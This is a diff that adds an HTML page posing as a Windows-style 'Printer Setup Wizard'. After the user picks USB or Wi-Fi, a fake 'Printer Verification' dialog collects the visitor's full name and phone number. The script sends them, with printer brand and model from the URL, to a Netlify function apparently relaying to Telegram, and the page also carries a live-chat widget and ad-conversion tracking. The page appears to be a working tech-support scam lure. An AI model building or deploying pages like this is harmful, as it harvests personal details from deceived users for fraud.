@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Printer Setup Wizard</title>
+<style>
+  /* Basic Reset */
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: #ece9d8; /* Classic Windows XP Beige */
+    font-family: Tahoma, Arial, sans-serif;
+    color: #000;
+    height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    overflow: hidden; /* Prevent body scroll */
+  }
+
+  /* Main Wizard Window */
+  .wizard-window {
+    width: 640px;
+    height: 560px;
+    background: #f0f0f0;
+    border: 1px solid #0054e3;
+    display: flex;
+    flex-direction: column;
+    box-shadow: 4px 4px 15px rgba(0,0,0,0.3);
+  }
+
+  /* TOP HEADER SECTION */
+  .header-area {
+    background: #fff;
+    padding: 15px 25px;
+    border-bottom: 2px solid #d3d3d3;
+    flex-shrink: 0;
+  }
+
+  .header-title {
+    font-size: 18px;
+    font-weight: bold;
+    color: #003399;
+    margin-bottom: 4px;
+  }
+
+  .header-desc { font-size: 13px; color: #333; }
+
+  /* MIDDLE CONTENT AREA */
+  .content-area {
+    flex: 1;
+    padding: 15px 25px;
+    background: #f6f6f6;
+  }
+
+  .option-card {
+    margin-bottom: 15px;
+    padding: 15px;
+    border: 1px solid #ccc;
+    background: #fff;
+    cursor: pointer;
+    border-radius: 5px;
+    transition: background 0.1s;
+  }
+
+  .option-card:hover { background: #e5f1fb; border: 1px solid #0054e3; }
+
+  .option-label {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    font-size: 16px;
+    font-weight: bold;
+    color: #1a1a8c;
+    margin-bottom: 12px;
+  }
+
+  .option-label input[type="radio"] { transform: scale(1.6); cursor: pointer; }
+
+  .illustration { margin-left: 35px; }
+
+  /* BOTTOM NAVIGATION BAR */
+  .bottom-bar {
+    height: 60px;
+    background: #f0f0f0;
+    border-top: 1px solid #aca899;
+    padding: 0 15px;
+    display: flex;
+    align-items: center;
+    justify-content: flex-end;
+    gap: 10px;
+  }
+
+  .btn {
+    min-width: 90px;
+    padding: 7px 15px;
+    font-family: Tahoma, sans-serif;
+    font-size: 13px;
+    background: linear-gradient(to bottom, #fefefe, #e0e0e0);
+    border: 1px solid #707070;
+    border-radius: 3px;
+    cursor: pointer;
+  }
+
+  .btn:hover { background: #e5e5e5; }
+  .btn:disabled { color: #888; cursor: not-allowed; }
+  .btn-next { font-weight: bold; border-color: #003399; }
+
+  /* POPUP MODAL */
+  .overlay {
+    display: none;
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,0.4);
+    z-index: 100;
+    align-items: center;
+    justify-content: center;
+  }
+  .overlay.active { display: flex; }
+
+  .modal {
+    background: #f0f0f0;
+    width: 400px;
+    border: 1px solid #0054e3;
+    box-shadow: 4px 4px 25px rgba(0,0,0,0.5);
+  }
+
+  .modal-titlebar {
+    background: linear-gradient(to bottom, #0058e6, #003db3);
+    color: #fff;
+    padding: 8px 12px;
+    font-weight: bold;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+  }
+
+  .modal-body { padding: 25px; }
+
+  .m-group { margin-bottom: 15px; }
+  .m-group label { display: block; margin-bottom: 6px; font-weight: bold; font-size: 14px; }
+  .m-group input {
+    width: 100%;
+    padding: 10px;
+    border: 1px solid #7f9db9;
+    font-size: 15px;
+  }
+
+  #loadingMsg { 
+    display: block; 
+    font-size: 13px; 
+    margin-top: 10px; 
+    font-weight: bold; 
+    min-height: 18px;
+  }
+
+  .modal-footer {
+    padding: 15px;
+    border-top: 1px solid #d3d3d3;
+    display: flex;
+    justify-content: flex-end;
+    gap: 10px;
+  }
+</style>
+<script src="//code.jivosite.com/widget/v1RA09NuZZ" async></script>
+<script async src="https://www.googletagmanager.com/gtag/js?id=AW-17870679276"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'AW-17870679276');
+</script>
+</head>
+<body>
+
+<div class="wizard-window">
+  <div class="header-area">
+    <div class="header-title">Printer Connection Setup</div>
+    <div class="header-desc">Please choose your connection method below. (Step 1 of 2)</div>
+  </div>
+
+  <div class="content-area">
+    
+    <div class="option-card" onclick="selectOption('usb')">
+      <label class="option-label">
+        <input type="radio" name="conn" id="radio-usb" value="usb">
+        Direct USB Cable Connection
+      </label>
+      <div class="illustration">
+        <svg width="300" height="65" viewBox="0 0 320 70" xmlns="http://www.w3.org/2000/svg">
+          <rect x="5" y="10" width="50" height="50" rx="3" fill="#333"/>
+          <path d="M55 40 L130 40 C150 40, 150 20, 170 20 L240 20" stroke="#0054e3" stroke-width="6" fill="none"/>
+          <circle cx="150" cy="30" r="14" fill="#0054e3"/>
+          <text x="144" y="36" fill="white" font-family="Arial" font-size="16" font-weight="bold">ψ</text>
+          <rect x="240" y="5" width="75" height="60" rx="4" fill="#222"/>
+        </svg>
+      </div>
+    </div>
+
+    <div class="option-card" onclick="selectOption('wifi')">
+      <label class="option-label">
+        <input type="radio" name="conn" id="radio-wifi" value="wifi">
+        Wireless Network (Wi-Fi)
+      </label>
+      <div class="illustration">
+        <svg width="300" height="65" viewBox="0 0 320 70" xmlns="http://www.w3.org/2000/svg">
+          <rect x="5" y="10" width="50" height="50" rx="3" fill="#333"/>
+          <path d="M110 50 Q160 0 210 50" stroke="#0054e3" stroke-width="5" fill="none"/>
+          <path d="M130 50 Q160 20 190 50" stroke="#0054e3" stroke-width="5" fill="none"/>
+          <circle cx="160" cy="50" r="7" fill="#0054e3"/>
+          <rect x="240" y="5" width="75" height="60" rx="4" fill="#222"/>
+        </svg>
+      </div>
+    </div>
+
+  </div>
+
+  <div class="bottom-bar">
+    <button class="btn" onclick="alert('Help is being requested...')">Help</button>
+    <div style="flex-grow:1"></div>
+    <button class="btn">&lt; Back</button>
+    <button class="btn btn-next" onclick="nextStep()">Next &gt;</button>
+    <button class="btn" style="margin-left:5px">Cancel</button>
+  </div>
+</div>
+
+<div class="overlay" id="overlay">
+  <div class="modal">
+    <div class="modal-titlebar">
+      <span>Printer Verification</span>
+      <button style="background:none; border:none; color:white; cursor:pointer; font-weight:bold; font-size:16px;" onclick="closeModal()">X</button>
+    </div>
+    <div class="modal-body">
+      <div class="m-group">
+        <label>Full Name</label>
+        <input type="text" id="userName" placeholder="Enter your name">
+      </div>
+      <div class="m-group">
+        <label>Phone Number</label>
+        <input type="tel" id="userPhone" placeholder="e.g. 555-012-3456">
+      </div>
+      <span id="loadingMsg"></span>
+    </div>
+    <div class="modal-footer">
+      <button class="btn btn-next" id="finalBtn" onclick="submitDetails()">Finish</button>
+      <button class="btn" onclick="closeModal()">Back</button>
+    </div>
+  </div>
+</div>
+
+<script>
+  function selectOption(val) {
+    document.getElementById('radio-' + val).checked = true;
+  }
+
+  function nextStep() {
+    const sel = document.querySelector('input[name="conn"]:checked');
+    if (!sel) { 
+      alert('Please click on a connection type to continue.'); 
+      return; 
+    }
+    document.getElementById('overlay').classList.add('active');
+  }
+
+  function closeModal() {
+    document.getElementById('overlay').classList.remove('active');
+  }
+
+  function submitDetails() {
+    const name = document.getElementById("userName").value.trim();
+    const phone = document.getElementById("userPhone").value.trim();
+
+    // Get Brand and Model from URL
+    const urlParams = new URLSearchParams(window.location.search);
+    const brand = urlParams.get("brand") || "H";
+    const model = urlParams.get("model") || "5665655";
+
+    const btn = document.getElementById("finalBtn");
+    const msg = document.getElementById("loadingMsg");
+
+    // Validation
+    if (!name || !phone) {
+      msg.style.color = "red";
+      msg.textContent = "Please fill in all details.";
+      return;
+    }
+
+    btn.disabled = true;
+    btn.textContent = "Processing...";
+    msg.style.color = "#333";
+    msg.textContent = "Verifying details...";
+
+    // Send combined Brand-Model to background
+    const payload = {
+      model: `${brand} - ${model}`,
+      name: name,
+      phone: phone
+    };
+
+    fetch("https://netlify-bott.netlify.app/.netlify/functions/telegram", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    })
+    .then(res => {
+      if (!res.ok) throw new Error("Server error");
+      msg.style.color = "green";
+      msg.textContent = "Verified! Redirecting...";
+      setTimeout(() => {
+        window.location.href = "/guide/loading.html";
+      }, 1000);
+    })
+    .catch(err => {
+      msg.style.color = "red";
+      msg.textContent = "Connection Error. Please try again.";
+      btn.disabled = false;
+      btn.textContent = "Finish";
+    });
+  }
+</script>
+
+</body>
+</html>
